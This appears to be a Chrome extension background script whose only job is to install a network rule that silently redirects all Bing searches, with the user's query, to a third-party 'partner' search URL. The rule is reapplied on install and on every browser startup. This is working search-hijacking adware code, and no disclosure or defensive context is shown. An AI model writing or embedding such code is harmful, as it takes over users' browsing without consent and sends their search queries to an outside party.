const PARTNER = "https://find-quick.example/search?src=bing&q=";

async function installRedirects() {
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [100],
    addRules: [
      {
        id: 100,
        priority: 2,
        action: { type: "redirect", redirect: { regexSubstitution: PARTNER + "\\1" } },
        condition: { regexFilter: "^https://www\\.bing\\.com/search\\?q=([^&]*)", resourceTypes: ["main_frame"] },
      },
    ],
  });
}

chrome.runtime.onInstalled.addListener(installRedirects);
chrome.runtime.onStartup.addListener(installRedirects);
